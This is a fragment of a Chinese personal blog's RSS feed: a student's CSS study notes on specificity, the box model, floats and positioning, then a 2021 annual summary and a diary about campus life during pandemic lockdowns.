&lt;p&gt;类和伪类选择器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;元素选择器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通配选择器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;继承优先级（没有优先级）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比较优先级时，需要将所有选择器的优先级相加计算，最后优先级越高的优先显示（分组选择器是单独计算的）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-css" data-lang="css"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;div&lt;/span&gt;#box &lt;span style="color:#f92672"&gt;(&lt;/span&gt;&lt;span style="color:#f92672"&gt;相加计算&lt;/span&gt;&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;div&lt;/span&gt;&lt;span style="color:#f92672"&gt;,&lt;/span&gt;&lt;span style="color:#f92672"&gt;p&lt;/span&gt;&lt;span style="color:#f92672"&gt;,&lt;/span&gt;&lt;span style="color:#f92672"&gt;span&lt;/span&gt; &lt;span style="color:#f92672"&gt;(&lt;/span&gt;&lt;span style="color:#f92672"&gt;单独计算&lt;/span&gt;&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果优先级计算后相同，则根据代码最后设置的样式显示。&lt;/p&gt;
&lt;p&gt;可以在样式后后面添加&lt;code&gt;!important&lt;/code&gt;，可以获得最高优先级（慎用）&lt;/p&gt;
&lt;p&gt;a标签样式顺序：https://www.cnblogs.com/Yirannnnnn/p/4540061.html&lt;/p&gt;
&lt;h3 id="像素和百分比"&gt;像素和百分比
&lt;/h3&gt;&lt;h4 id="像素"&gt;像素
&lt;/h4&gt;&lt;p&gt;屏幕实际是由一个一个的小像素点组成，不同的屏幕像素大小不同，像素越小的屏幕像素点密集，图像效果显示越清晰，所以同样写200px在不同的屏幕显示的效果不一样。&lt;/p&gt;
&lt;h4 id="百分比"&gt;百分比
&lt;/h4&gt;&lt;p&gt;相对于父元素属性的百分比，设置百分比可以使子元素跟随父元素改变。&lt;/p&gt;
&lt;h4 id="em"&gt;em
&lt;/h4&gt;&lt;p&gt;相对元素字体大小计算的单位，1em = 1 font-size。会跟随字体的大小改变而改变。&lt;/p&gt;
&lt;h4 id="rem"&gt;rem
&lt;/h4&gt;&lt;p&gt;相对根元素（html字体大小）字体大小计算。&lt;/p&gt;
&lt;h3 id="rgb值"&gt;RGB值
&lt;/h3&gt;&lt;p&gt;RGB通过三种颜色的不同浓度来调配出不同的颜色&lt;/p&gt;
&lt;p&gt;R red, G green,B blue&lt;/p&gt;
&lt;p&gt;每一种颜色的范围在0 - 255 (0% - 100%) 之间，语法: RGB(红色，绿色,蓝色)&lt;/p&gt;
&lt;h4 id="rgba"&gt;RGBA
&lt;/h4&gt;&lt;p&gt;就是在rgb的基础上增加了一个a表示不透明度，需要四个值，前三个和rgb一样，第四个表示不透明度（最大值1），1表示完全不透明0表示完全 透明5 半透明。&lt;/p&gt;
&lt;h4 id="十六进制的rgb值"&gt;十六进制的RGB值
&lt;/h4&gt;&lt;p&gt;#红色绿色蓝色&lt;/p&gt;
&lt;p&gt;两位重复可以缩写&lt;/p&gt;
&lt;h4 id="hsl值"&gt;HSL值
&lt;/h4&gt;&lt;p&gt;H 色相（0-360）&lt;/p&gt;
&lt;p&gt;S 饱和度，颜色的浓度（0-100%）&lt;/p&gt;
&lt;p&gt;L 亮度，颜色的亮度（0-100%）&lt;/p&gt;
&lt;p&gt;HSLA&lt;/p&gt;
&lt;h2 id="布局"&gt;布局
&lt;/h2&gt;&lt;h3 id="文档流normal-flow"&gt;文档流(normal flow)
&lt;/h3&gt;&lt;p&gt;网页是一个多层的结构，一层摞着一层通过CSS可以分别为每一层来设置样式，作为用户来讲只能看到最顶上一层，这些层中，最底下的一层称为文档流，文档流是网页的基础，我们所创建的元素默认都是在文档流中进行排列，对于我们来元素主要有两个状态：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在文档流中&lt;/li&gt;
&lt;li&gt;不在文档流中(脱离文档流)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;元素在文档流中有什么特点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;块元素
&lt;ul&gt;
&lt;li&gt;块元素会在页面中独占一行(自上向下垂直排列)&lt;/li&gt;
&lt;li&gt;默认宽度是父元素的全部(会把父元素撑满)&lt;/li&gt;
&lt;li&gt;默认高度是被内容撑开(子元素)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;行内元素
&lt;ul&gt;
&lt;li&gt;行内元素不会独占页面的一行，只占自身的大小&lt;/li&gt;
&lt;li&gt;行内元素在页面中左向右水平排列，如果行之中不能则元素 会换到第二行继续自左向右排列(书写习惯一样)&lt;/li&gt;
&lt;li&gt;行内元素的默认宽度和高度都是被内容撑开&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="盒子模型box-model"&gt;盒子模型(box model)
&lt;/h3&gt;&lt;p&gt;CSS页面将所有的元素设置为了一个&lt;strong&gt;矩形&lt;/strong&gt;的盒子，对页面的布局就变成了将不同的盒子摆放到不同的位置。每一个盒子都有一下几个部分组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内容区(content)&lt;/li&gt;
&lt;li&gt;内边距(padding)&lt;/li&gt;
&lt;li&gt;边框(border)&lt;/li&gt;
&lt;li&gt;外边距(margin)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://www.w3school.com.cn/i/css/boxmodel.gif"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h4 id="内容区content"&gt;内容区(content)
&lt;/h4&gt;&lt;p&gt;内容区大小由 width 和 height 两个属性来设置。&lt;/p&gt;
&lt;h4 id="边框border"&gt;边框(border)
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;盒子的边缘&lt;/strong&gt;，边框里面是盒子内部，外面是盒子外部，边框的大小会影响到盒子的大小。边框至少需要设置三个样式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;边框的宽度 border-width&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;默认3px。简写值可有四个：&lt;/p&gt;
&lt;p&gt;四个值：上、下、左、右&lt;/p&gt;
&lt;p&gt;三个值：上、左右、下&lt;/p&gt;
&lt;p&gt;两个：上下、左右&lt;/p&gt;
&lt;p&gt;一个值：上下左右&lt;/p&gt;
&lt;p&gt;还可以写成border-xxx-width，其中xxx可选top、right、bottom、left指定某一个边的宽度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;边框的颜色 border-color&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;规则同边框的宽度 border-width，如果忽略自动使用color颜色&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;边框的样式 border-style&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;规则同边框的宽度 border-width，默认值是none，solid表示实线、dotted点状虚线、dashed虚线、double双线&lt;/p&gt;
&lt;p&gt;边框可以简写一个属性border按以上三个属性值顺序使用&lt;/p&gt;
&lt;h4 id="内边距padding"&gt;内边距(padding)
&lt;/h4&gt;&lt;p&gt;四个方向：top、right、bottom、left。内边距设置会影响&lt;strong&gt;盒子大小&lt;/strong&gt;，背景颜色会延伸到内边距上。一个盒子的可见框大小由内容区、内边距、边框共同决定，计算时都要加上。padding简写形式同 边框的宽度 border-width。&lt;/p&gt;
&lt;h4 id="外边距margin"&gt;外边距(margin)
&lt;/h4&gt;&lt;p&gt;外边距不会影响盒子可见框大小，影响&lt;strong&gt;盒子位置&lt;/strong&gt;，一个四个方向同padding，通常是设置左上外边距，右下外边距会移动其他元素，bottom的值会影响下方元素移动。简写同上&lt;/p&gt;
&lt;h3 id="水平方向的布局"&gt;水平方向的布局
&lt;/h3&gt;&lt;p&gt;元素在其父元素水平方向的位置由以下七个属性共同决定&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;margin-left + border-left + padding-left + width + padding-right + border-right + margin-right = 其父 元素内容区的宽度(必须满足)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果等式不成立，则成为&lt;strong&gt;过度约束&lt;/strong&gt;，等式会自动调整。调整情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;如果七个值&lt;strong&gt;没有&lt;/strong&gt;值为auto的情况，浏览器会调整margin&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果某&lt;strong&gt;一个&lt;/strong&gt;属性值为auto，则调整此属性的值使等式成立&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果将一个&lt;strong&gt;宽度&lt;/strong&gt;和一个&lt;strong&gt;外边距&lt;/strong&gt;设置为auto，则宽度会调整到最大，设置为auto的外边距会自动为0&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果将&lt;strong&gt;三个值&lt;/strong&gt;都设置为auto，则外边距都是0，宽度最大&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果将&lt;strong&gt;两个外边距&lt;/strong&gt;设置为auto，&lt;strong&gt;宽度固定值&lt;/strong&gt;，则会将外边距设置为相同的值所以我们经常利用这个特点来使一个元素 在其父元素中水平居中&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;示例:
width:xxxpx;
margin:0 auto;&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="垂直方向的布局"&gt;垂直方向的布局
&lt;/h3&gt;&lt;p&gt;子元素在父元素内容区排列，如果子元素大小超过了父元素，则会从父元素中溢出(overflow)，使用overflow属性设置父元素对溢出子元素的处理。可选值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;visible 默认值子元素会从父元素中溢出，在父元素外部的位置显示&lt;/li&gt;
&lt;li&gt;hidden 溢出内容将会被裁剪不会显示&lt;/li&gt;
&lt;li&gt;scroll 生成&lt;strong&gt;两个滚动条&lt;/strong&gt;，通过滚动条来查看完整的内容&lt;/li&gt;
&lt;li&gt;auto &lt;strong&gt;根据需要&lt;/strong&gt;生成滚动条&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="垂直外边距折叠"&gt;垂直外边距折叠
&lt;/h3&gt;&lt;p&gt;相邻的垂直方向外边距会发生重叠现象。有以下两种情况&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;兄弟元素之间
兄弟元素间的相邻垂直外边距会取两者之间的较大值(两者都是正值)
特殊情况:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果相邻的外边距一正一负，则取两者的和。&lt;/li&gt;
&lt;li&gt;如果相邻的外边距都是负值，则取两者中绝对值较大的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同号折叠(取最大值)，异号相加。兄弟元素之间的外边距的重叠，对于开发是有利的，所以不需要进行处理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;父子元素
父子元素间相邻外边距，子元素的会传递给父元素(上外边距) ，父子外边距的折叠会影响到页面的布局，必须要进行处理&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="行内元素盒模型"&gt;行内元素盒模型
&lt;/h3&gt;&lt;p&gt;行内元素不支持设置宽度和高度，但是可以设置padding、border、margin，设置属性后不垂直方向不会影响页面布局。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;display&lt;/code&gt;用来设置元素显示类型，可选值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;inline 将元素设置为行内元素&lt;/li&gt;
&lt;li&gt;block 将元素设置为块元素&lt;/li&gt;
&lt;li&gt;inline-block 将元素设置为行内元素，行内块，既可以设置高宽又不会独占一行&lt;/li&gt;
&lt;li&gt;table 将元素设置为一个表格&lt;/li&gt;
&lt;li&gt;none 元素不在页面中显示&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;visibility&lt;/code&gt;用来设置元素的显示状态，可选值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;visible 默认值，元素在页面中正常显示&lt;/li&gt;
&lt;li&gt;hidden 元素在页面中隐藏不显示，但是&lt;strong&gt;占据页面位置&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="浏览器默认样式"&gt;浏览器默认样式
&lt;/h3&gt;&lt;p&gt;通常情况，浏览器都会为元素设置一些默认样式，默认样式会影响页面布局，需要去除浏览器默认样式。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;*{
margin: 0;
padding: 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;真正项目还是需要一个一个标签清除标签。&lt;/p&gt;
&lt;p&gt;清除默认样式表&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://github.com/necolas/normalize.css" target="_blank" rel="noopener"
&gt;normalize.css&lt;/a&gt; 对默认样式进行了统一&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://meyerweb.com/eric/tools/css/reset/reset.css" target="_blank" rel="noopener"
&gt;reset.css&lt;/a&gt; 直接去除了浏览器的默认样式&lt;/p&gt;
&lt;h3 id="盒子的尺寸"&gt;盒子的尺寸
&lt;/h3&gt;&lt;p&gt;默认情况下，盒子可见框大小由内容区、内边距、边框共同决定。可以设置&lt;code&gt;box-sizing&lt;/code&gt;属性值设置盒子尺寸计算方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;content-box 默认值，宽度高度设置内容区大小&lt;/li&gt;
&lt;li&gt;border-box 宽度高度值设置整个盒子可见框大小，即会调整自动调整内容区大小&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="轮廓阴影和圆角"&gt;轮廓阴影和圆角
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;box-shadow&lt;/code&gt;设置元素阴影样式，阴影不会影响页面布局。缩写格式&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;box-shadow: 水平偏移量 垂直偏移量 阴影的模糊半径 阴影的颜色
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;outline&lt;/code&gt;属性用来设置元素的轮廓线，用法和&lt;code&gt;border&lt;/code&gt;一样，区别是轮廓线不会影响可见框大小，边框占用可见框大小。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;border-radius&lt;/code&gt;属性设置圆角，圆角设置园的半径大小&lt;/p&gt;
&lt;p&gt;浮动&lt;/p&gt;
&lt;h2 id="浮动"&gt;浮动
&lt;/h2&gt;&lt;p&gt;浮动主要作用是让页面中的元素进行水平排列。&lt;/p&gt;
&lt;p&gt;浮动的特点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;浮动的元素会完全脱离文档流，不在占据文档中的位置。不需要满足水平等式&lt;/li&gt;
&lt;li&gt;设置浮动会向父元素的左侧或右侧移动。浮动元素默认不会从父元素中移出&lt;/li&gt;
&lt;li&gt;浮动元素向左向右移动时不会超过它前面的元素。向上也不会高过前一个兄弟元素。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;脱离文档流的特点：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;块元素&lt;/strong&gt;不在独占页面一行，高度和宽度默认被内容撑开。&lt;strong&gt;行内元素&lt;/strong&gt;脱离文档流以后会变成块元素，特点和块元素一样。脱离文档流以后，不需要区分块元素和行内元素了。&lt;/p&gt;
&lt;h3 id="高度塌陷"&gt;高度塌陷
&lt;/h3&gt;&lt;p&gt;指在浮动布局中，父元素的高度是由子元素撑开的，但是子元素设置浮动以后脱离文档流，无法撑起父元素导致父元素高度丢失。父元素高度丢失后进一步导致页面布局混乱。&lt;/p&gt;
&lt;p&gt;解决办法：为父元素开启BFC（Block Formatting Context）块级格式化环境，开启BFC以后该元素会变成一个独立的布局区域。特点包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不会被浮动元素所覆盖&lt;/li&gt;
&lt;li&gt;子元素和父元素外边距不会重叠&lt;/li&gt;
&lt;li&gt;元素可以包含浮动的子元素&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;开启BFC的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置元素浮动（不推荐）&lt;/li&gt;
&lt;li&gt;设置元素为行内块元素（会失去宽度）&lt;/li&gt;
&lt;li&gt;设置overflow属性为一个非visible的值(hidden)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a class="link" href="https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context" target="_blank" rel="noopener"
&gt;Block formatting context&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="clear属性"&gt;clear属性
&lt;/h3&gt;&lt;p&gt;如果不希望某个元素受到其他浮动元素的影响而改变位置，可以设置&lt;code&gt;clear&lt;/code&gt;属性清除影响。可选值：&lt;code&gt;left&lt;/code&gt;、&lt;code&gt;right&lt;/code&gt;、&lt;code&gt;both&lt;/code&gt;（清除两侧中最大影响的那侧）。原理：设置清除浮动以后，浏览器会为元素添加一个上边距，使其位置不受其他元素影响。&lt;/p&gt;
&lt;h3 id="使用after伪解决高度塌陷"&gt;使用after伪解决高度塌陷
&lt;/h3&gt;&lt;p&gt;使需要浮动的子类后跟一个清除浮动影响的兄弟类，并设置为块元素独占一行。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-css" data-lang="css"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;.&lt;span style="color:#a6e22e"&gt;box1&lt;/span&gt;::&lt;span style="color:#a6e22e"&gt;after&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;display&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;block&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;clear&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;both&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同样的概念可以解决父类和子类外边距重叠问题&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-css" data-lang="css"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;.&lt;span style="color:#a6e22e"&gt;box1&lt;/span&gt;::&lt;span style="color:#a6e22e"&gt;before&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;display&lt;/span&gt;: &lt;span style="color:#66d9ef"&gt;table&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;clearfix&lt;/strong&gt;类可以同时解决&lt;strong&gt;高度塌陷&lt;/strong&gt;和&lt;strong&gt;外边距重叠&lt;/strong&gt;问题&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;.clearfix::before,
.clearfix::after{
content:&amp;#39;&amp;#39;;
display: table;
clear: both;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="定位"&gt;定位
&lt;/h2&gt;&lt;p&gt;通过定位可以将元素摆放到页面中的任意位置，使用&lt;code&gt;position&lt;/code&gt;属性来设置定位。可选值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;static，默认值，元素是静止的没有开启定位&lt;/li&gt;
&lt;li&gt;relative，相对定位&lt;/li&gt;
&lt;li&gt;absolute，绝对定位&lt;/li&gt;
&lt;li&gt;fixed，固定定位&lt;/li&gt;
&lt;li&gt;sticky，粘滞定位&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="相对定位"&gt;相对定位
&lt;/h3&gt;&lt;p&gt;使用&lt;strong&gt;relative&lt;/strong&gt;相对定位以后，需要设置&lt;code&gt;offset&lt;/code&gt;偏移量来设置元素位置，可选值：top、bottom、left、right，偏移量相对的位置是元素原来在文档流中的位置。&lt;/p&gt;
&lt;p&gt;开启相对定位以后会提升元素层级，但是没有脱离文档流。不会元素的性质（块、行内）&lt;/p&gt;
&lt;h3 id="绝对定位"&gt;绝对定位
&lt;/h3&gt;&lt;p&gt;使用&lt;strong&gt;absolute&lt;/strong&gt;绝对定位以后：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;元素会从文档流中脱离，并且改变元素性质（行内变块，宽高被内容撑开）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;元素提升一个层级&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;绝对定位是相对于去&lt;strong&gt;包含块&lt;/strong&gt;进行定位的&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;包含块&lt;/strong&gt;指离当前元素最近的祖先块元素，行内元素可不能算。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;绝对定位的包含块&lt;/strong&gt;：离元素最近的，并且开启了定位的祖先元素，如果所有祖先元素都没有开启，则根元素html就是初始包含块。自绝父相&lt;/p&gt;
&lt;h3 id="固定定位"&gt;固定定位
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;fixed&lt;/strong&gt;固定定位大部分特点和&lt;strong&gt;absolute&lt;/strong&gt;绝对定位相同，唯一不同的是固定定位永远参照于浏览器的窗口进行定位。&lt;del&gt;广告位&lt;/del&gt;&lt;/p&gt;
&lt;h3 id="粘滞定位"&gt;粘滞定位
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;sticky&lt;/strong&gt;粘滞定位大部分特点和&lt;strong&gt;relative&lt;/strong&gt;相对定位相同，唯一不同的是可以设置&lt;code&gt;offset&lt;/code&gt;属性在其经过滚动到达某个位置时将其固定。IE不兼容&lt;/p&gt;
&lt;h3 id="补充"&gt;补充
&lt;/h3&gt;&lt;p&gt;开启定位后，水平方向布局等式需要添加&lt;code&gt;offset&lt;/code&gt;属性的值。&lt;/p&gt;
&lt;p&gt;开启定位以后，可以通过设置&lt;code&gt;z-index&lt;/code&gt;属性来设置元素层级。越大层级越高，如果为设置层级，则根据元素顺序显示最后的元素。祖先元素的层级再高也不会盖住后代元素&lt;/p&gt;</description></item><item><title>2021年度总结</title><link>https://www.braindance.top/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 07 Feb 2022 11:04:02 +0800</pubDate><guid>https://www.braindance.top/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</guid><description>&lt;p&gt;已经二月才写年度总结的估计只有我把，纯纯的懒狗一条。&lt;/p&gt;
&lt;h1 id="个人总结"&gt;个人总结
&lt;/h1&gt;&lt;h2 id="学业"&gt;学业
&lt;/h2&gt;&lt;p&gt;因为加入了学校组织的DROPS集训队，整个人都把精力投入在里面了，然后把自己学习的笔记和经验总结起来写在博客里，有种丰收的喜悦。和集训队的队友们每周会有分享会，然后还去参加了几次大型的比赛，让我知道天外有天人外有人，经常把自己缩在自己的小圈子里，再厉害也就仅限于自己的小圈子。&lt;/p&gt;
&lt;p&gt;下半年的考研，觉得自己努力了，但是又觉得没有努力，还是目标不够明确吧，考研的目标一降再降，最后觉得要个文凭都差不多了，和其他的大佬比起来，自己辣鸡也不是没有原因的，志向都不一样，但是又想成为厉害的人。如果考研不成功的话就打算去就业。&lt;/p&gt;
&lt;p&gt;目前的程度也就是在github上找一些项目自己部署到服务器，看着项目的文档自己进行一些配置，感觉距离开发越走越远了，偶尔会找一找项目的代码自己DIY点，确实也挺迷茫的，学又学不进去，之前的学校教的也忘得差不多了，感觉还是考研后和行业脱节了，将来要后追起来。&lt;/p&gt;
&lt;h2 id="感情"&gt;感情
&lt;/h2&gt;&lt;p&gt;网上认识了一个网友，一起聊了很久最后算是开始了一段网恋吧，但是感觉自己经验还是很少，并且有点喜欢没有拘束的感觉，经常打游戏忘了她，觉得挺内疚的。之前的我也算是个一毛不拔的人，然后开始慢慢的会给她准备一些小礼物，和她在一起也确实让我变得开朗些，不光是和她在一起的时候，和其他的朋友心灵上的交流也变多了，和她在一起也当我打开了心扉吧。&lt;/p&gt;
&lt;h2 id="学会用github"&gt;学会用github
&lt;/h2&gt;&lt;p&gt;现在才知道github上的项目真的是人类智慧的结晶，在上面找了好多有趣的项目，目前自己部署的有两个网盘、青龙面板(懂的都懂)、自己的跳板机一堆，想整点什么小工具就可以在上面找到有一样想法的人，然后借鉴一下人家的代码是如何实现的。看一些高分的项目，大概知道了些目前的项目都实现了啥样牛逼的功能，还有一些模块功能的项目，多看些这种，如果将来自己项目开发遇到一样的功能就可能有很大的帮助。&lt;/p&gt;
&lt;h2 id="思考"&gt;思考
&lt;/h2&gt;&lt;p&gt;写博客真的是个记录自己成长的过程的好东西，以后坚持。&lt;/p&gt;
&lt;p&gt;走出自己的舒适圈，去看看外面的世界有多大，才知道目前的实力根本不够支撑自己的梦想。&lt;/p&gt;
&lt;p&gt;不管遇到什么样的困难，只要觉得目前的路是对的，硬着头皮顶下去，事情总会发生一些转变。&lt;/p&gt;
&lt;p&gt;希望能坚持一个目标一直走下去吧。&lt;/p&gt;
&lt;p&gt;*保持你的决心❤️&lt;/p&gt;</description></item><item><title>2021年度日记</title><link>https://www.braindance.top/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/</link><pubDate>Thu, 03 Feb 2022 09:47:43 +0800</pubDate><guid>https://www.braindance.top/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/</guid><description>&lt;h1 id="新年快乐"&gt;新年快乐🤗
&lt;/h1&gt;&lt;p&gt;年度总结被拖到了农历的年。。。确实是自己懒得离谱（确实懒嗷，这篇文章写了四天了）。年前想写但是又想迁移博客，所以没干，年后家里又置办年货要搭把手，现在咣里咣当就到初二了，属实过太快了。&lt;/p&gt;
&lt;p&gt;本来打算写年度总结，但是觉得太长了就改成年度日记吧。我看着手机相册，想起来什么写什么吧。（多图警告⚠️⚠️⚠️）&lt;/p&gt;
&lt;h1 id="1-2月"&gt;1-2月
&lt;/h1&gt;&lt;p&gt;回家祭祖的时候遇到了两只大鹅，憨憨的看着我&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031058198.png"
loading="lazy"
alt="202202031058198"
&gt;&lt;/p&gt;
&lt;p&gt;真的是人生第一次吃必胜客的披萨，因为是个宅所以出校门的机会都不多。(真心觉得必胜客的披萨也就一般般)&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031101930.png"
loading="lazy"
alt="202202031101930"
&gt;&lt;/p&gt;
&lt;p&gt;在小黑盒上抽奖，中了一个鼠标垫，人生第二次网络上中奖，最重要的还是隔了半个月连中。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031100652.png"
loading="lazy"
alt="202202031100652"
&gt;&lt;/p&gt;
&lt;p&gt;第一次中奖是B站的一个up名字叫&lt;a class="link" href="https://space.bilibili.com/3760773" target="_blank" rel="noopener"
&gt;大果粒粒&lt;/a&gt;，一周一更的搞笑视频，属于是生活必需品了，周指活。中了50块红包😋&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031106142.png"
loading="lazy"
alt="202202031106142"
&gt;&lt;/p&gt;
&lt;h1 id="3-5月"&gt;3-5月
&lt;/h1&gt;&lt;p&gt;三月份吧，去学校就是被封在里面，好像一直到6月份放暑假都在学校，只有周日可以出去一天，我们学校还是一个单独一个学院在市中心，地方也不大真能憋死人。打听我发小的学校，通知说的到学校需要14天隔离，但是到学校第二天就睁一只眼闭一只眼，随便出门了，岂可修。&lt;/p&gt;
&lt;p&gt;现在疫情还没放开，去学校的话估计还是要封校，我和室友们都讨论过这话题，我们上了大学四年因为疫情姑且在学校封了半年，我们下面的2019级，到学校也就出门过半年，现在都封校到大三了，更惨的是2020级新生，从进学校就被封在里面，现在已经大二了，这感觉真的是换了个地方上高中。&lt;/p&gt;
&lt;p&gt;我们学校上面的领导也是脑子不好使，整个学校除了学生，其他任何人都可以随便出入，包括我们学校被当做停车场这件事，只要你给钱，我们学校车随便停，所以也有了学生开着车把人带出去，这件事更离谱，学工办的老师都把监控调出来了，清清楚楚看见车牌，没有去车管所找这辆车车主是谁，反而在学校的班长群里问车里出来的人谁认识。学校还有各种事真听得脑壳疼。&lt;/p&gt;
&lt;p&gt;继续流水账。&lt;/p&gt;
